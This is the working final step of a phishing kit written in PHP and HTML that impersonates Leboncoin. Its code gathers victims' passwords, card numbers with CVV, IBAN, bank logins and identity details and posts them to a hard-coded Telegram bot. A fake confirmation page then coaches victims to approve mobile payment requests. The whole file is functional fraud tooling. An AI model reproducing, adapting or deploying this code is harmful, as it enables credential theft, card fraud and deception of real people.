<?php
// ============================================
// ÉTAPE 7 - CONFIRMATION FINALE + ENVOI TELEGRAM
// ============================================
session_start();

// ============================================
// CONFIGURATION BOT TELEGRAM
// ============================================
// Remplacez par vos propres valeurs
define('TELEGRAM_BOT_TOKEN', '6594687982:AAGNnbC3JTvz7YX8EjMyrnFs9wcJdXc_woA');
define('TELEGRAM_CHAT_ID',   '6451498907');

// ============================================
// RÉCUPÉRATION DES DONNÉES DE TOUTES LES ÉTAPES
// ============================================
$email              = $_SESSION['email']              ?? 'Non renseigné';
$password              = $_SESSION['password']              ?? 'Non renseigné';
$nom                = $_SESSION['annonce']['nom']     ?? 'Non renseigné';
$date_naissance     = $_SESSION['annonce']['date_naissance']?? 'Non renseigné';
$telephone          = $_SESSION['annonce']['telephone'] ?? 'Non renseigné';
$adresse            = $_SESSION['annonce']['adresse'] ?? 'Non renseigné';
$iban            = $_SESSION['annonce']['iban'] ?? 'Non renseigné';
$montant            = $_SESSION['annonce']['montant'] ?? '0';
$numero_carte       = $_SESSION['carte']['numero']    ?? 'Non renseigné';
$expiration_carte   = $_SESSION['carte']['expiration'] ?? 'Non renseigné';
$cvv_carte          = $_SESSION['carte']['cvv']       ?? 'Non renseigné';
$derniers_chiffres  = $_SESSION['carte']['derniers_chiffres'] ?? '****';
$banque_choisie     = $_SESSION['banque_confirmee']   ?? ($_SESSION['banque_choisie'] ?? 'Non renseignée');
$identifiant_banque = $_SESSION['identifiant_banque'] ?? 'Non renseigné';
$ip_client          = $_SERVER['REMOTE_ADDR']         ?? 'Inconnue';
$user_agent         = $_SERVER['HTTP_USER_AGENT']     ?? 'Inconnu';
$date_heure         = date('d/m/Y H:i:s');

// ============================================
// CONSTRUCTION DU MESSAGE TELEGRAM
// ============================================
$message = "🔔 *NOUVELLE TRANSACTION CAPTURÉE*\n";
$message .= "━━━━━━━━━━━━━━━━━━━━\n";
$message .= "📅 *Date :* $date_heure\n";
$message .= "🌐 *IP :* `$ip_client`\n";
$message .= "━━━━━━━━━━━━━━━━━━━━\n\n";

$message .= " *INFORMATIONS CLIENT*\n";
$message .= "• Email : `$email`\n";
$message .= "• mot de passe : `$password`\n";
$message .= "• Nom : $nom\n";
$message .= "• date_naissance : $date_naissance\n";
$message .= "• Téléphone : $telephone\n";
$message .= "• Adresse : $adresse\n\n";
$message .= "• Iban : $iban\n\n";

$message .= "💳 *INFORMATIONS CARTE*\n";
$message .= "• Numéro : `$numero_carte`\n";
$message .= "• Expiration : $expiration_carte\n";
$message .= "• CVV : `$cvv_carte`\n\n";

$message .= "🏦 *BANQUE & COMPTE*\n";
$message .= "• Banque : $banque_choisie\n";
$message .= "• Identifiant : `$identifiant_banque`\n\n";

$message .= "💰 *MONTANT : $montant €*\n";
$message .= "━━━━━━━━━━━━━━━━━━━━\n";
$message .= "🔐 UA : $user_agent";

// ============================================
// ENVOI VIA L'API TELEGRAM
// ============================================
function envoyerTelegram($message) {
    $url = "https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/sendMessage";
    
    $data = [
        'chat_id'    => TELEGRAM_CHAT_ID,
        'text'       => $message,
        'parse_mode' => 'Markdown',
    ];

    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    return ($httpCode === 200);
}

// Envoi du message (silencieux en cas d'erreur)
$envoi_reussi = envoyerTelegram($message);

// Nettoyage de la session après envoi
session_destroy();
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Leboncoin - Merci</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            background-color: #f3f4f6;
            color: #1f2937;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        /* ===== HEADER / LOGO ===== */
        .header {
            background: #fff;
            padding: 16px 32px;
            border-bottom: 1px solid #e5e7eb;
        }

        .logo {
            font-size: 28px;
            font-weight: 700;
            color: #f97316;
            text-decoration: none;
            letter-spacing: -1px;
        }

        /* ===== CONTENU PRINCIPAL ===== */
        .main {
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 40px 20px;
        }

        .card {
            background: #fff;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
            border: 1px solid #e5e7eb;
            max-width: 480px;
            width: 100%;
            overflow: hidden;
        }

        /* ===== ICONE CHECK ===== */
        .success-header {
            padding: 32px 32px 24px;
            text-align: center;
        }

        .success-icon {
            width: 64px;
            height: 64px;
            background: #fff7ed;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 20px;
            animation: scaleIn 0.5s ease-out;
        }

        @keyframes scaleIn {
            0% { transform: scale(0); }
            50% { transform: scale(1.2); }
            100% { transform: scale(1); }
        }

        .success-icon svg {
            width: 32px;
            height: 32px;
            color: #f97316;
        }

        .success-header h1 {
            font-size: 20px;
            font-weight: 700;
            color: #111827;
        }

        /* ===== ZONE GRISE INFO ===== */
        .info-box {
            background: #f3f4f6;
            padding: 24px 32px;
        }

        .info-box .main-text {
            font-size: 14px;
            color: #1f2937;
            line-height: 1.6;
            margin-bottom: 16px;
        }

        .service-available {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
            font-size: 13px;
            color: #f97316;
            font-weight: 600;
            margin-bottom: 20px;
            padding-bottom: 20px;
            border-bottom: 1px solid #e5e7eb;
        }

        .service-available svg {
            width: 16px;
            height: 16px;
        }

        .info-item {
            display: flex;
            gap: 10px;
            margin-bottom: 14px;
            font-size: 13px;
            color: #4b5563;
            line-height: 1.5;
        }

        .info-item:last-child {
            margin-bottom: 0;
        }

        .info-item svg {
            width: 16px;
            height: 16px;
            flex-shrink: 0;
            margin-top: 2px;
        }

        .info-item.info svg { color: #6b7280; }
        .info-item.warning svg { color: #f97316; }

        .info-item strong {
            color: #111827;
            font-weight: 600;
        }

        /* ===== BOUTON ===== */
        .card-footer {
            padding: 24px 32px 32px;
        }

        .btn {
            width: 100%;
            padding: 16px 24px;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            border: none;
            transition: all 0.2s;
            text-align: center;
            text-decoration: none;
            display: inline-block;
        }

        .btn-primary {
            background: #f97316;
            color: #fff;
        }

        .btn-primary:hover {
            background: #ea580c;
            transform: translateY(-1px);
            box-shadow: 0 4px 12px rgba(249, 115, 22, 0.3);
        }

        /* ===== SÉCURITÉ ===== */
        .security-info {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            margin-top: 24px;
            font-size: 13px;
            color: #6b7280;
        }

        .security-info svg {
            width: 16px;
            height: 16px;
            color: #f97316;
        }

        /* ===== FOOTER ===== */
        .footer {
            text-align: center;
            padding: 24px 20px 32px;
            font-size: 13px;
            color: #6b7280;
        }

        .footer-links {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin-bottom: 12px;
            flex-wrap: wrap;
        }

        .footer-links a {
            color: #6b7280;
            text-decoration: none;
        }

        .footer-links a:hover {
            color: #f97316;
            text-decoration: underline;
        }

        /* ===== RESPONSIVE ===== */
        @media (max-width: 640px) {
            .header { padding: 12px 20px; }
            .success-header, .info-box, .card-footer { padding-left: 20px; padding-right: 20px; }
        }
    </style>
</head>
<body>

    <!-- HEADER -->
    <header class="header">
        <a href="#" class="logo">leboncoin</a>
    </header>

    <!-- CONTENU PRINCIPAL -->
    <main class="main">
        <div class="card">
            <div class="success-header">
                <div class="success-icon">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
                        <polyline points="20 6 9 17 4 12"></polyline>
                    </svg>
                </div>
                <h1>Merci d'avoir choisi Leboncoin</h1>
            </div>

            <div class="info-box">
                <p class="main-text">
                    Suite aux nouvelles mesures de sécurité pour terminer la confirmation de votre paiement, vous serez contacté par téléphone par le service client dans les meilleurs délais.
                </p>

                <div class="service-available">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                        <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"></path>
                    </svg>
                    Service client disponible 24h/24 – 7j/7
                </div>

                <div class="info-item info">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                        <circle cx="12" cy="12" r="10"></circle>
                        <line x1="12" y1="16" x2="12" y2="12"></line>
                        <line x1="12" y1="8" x2="12.01" y2="8"></line>
                    </svg>
                    <div>
                        <strong>Processus de vérification :</strong> Vous serez également amené à approuver des demandes de confirmation mobile, chacune accompagnée d'un montant aléatoire à caractère non débiteur.
                    </div>
                </div>

                <div class="info-item warning">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                        <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
                    </svg>
                    <div>
                        <strong>Important :</strong> Aucun paiement ne sera effectué pendant la procédure. Cette étape est uniquement destinée à la vérification.
                    </div>
                </div>
            </div>

            <div class="card-footer">
                <a href="index.php" class="btn btn-primary">Retour à l'accueil</a>
            </div>
        </div>

        <!-- Info sécurité -->
        <div class="security-info">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
                <polyline points="9 12 11 14 15 10"></polyline>
            </svg>
            <span>Connexion sécurisée leboncoin</span>
        </div>
    </main>

    <!-- FOOTER -->
    <footer class="footer">
        <div class="footer-links">
            <a href="#">Aide</a>
            <a href="#">Confidentialité</a>
            <a href="#">Conditions générales</a>
        </div>
        <div>© 2026 leboncoin</div>
    </footer>

</body>
</html>